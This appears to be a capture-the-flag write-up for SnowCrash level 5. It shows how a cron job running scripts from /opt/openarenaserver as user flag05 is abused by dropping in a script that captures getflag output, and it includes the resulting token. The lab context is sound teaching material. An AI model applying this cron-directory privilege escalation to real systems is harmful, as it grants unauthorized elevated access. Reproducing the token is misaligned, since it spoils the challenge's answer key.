# Level05

First thing we see when we login..
```
level05@192.168.64.4's password: 
You have new mail.
```

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ 
```
The mail contains a cron that execute this file `/usr/sbin/openarenaserver` every 2 minutes

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
This script runs each file contains in `/opt/openarenaserver/` and then delete it.

```
echo "getflag > /tmp/flag05" > /opt/openarenaserver/monscript
```
We created a file that write the output of `getflag` in `/tmp/flag05`

Then we wait at least 2 minutes..
```
level05@SnowCrash:~$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```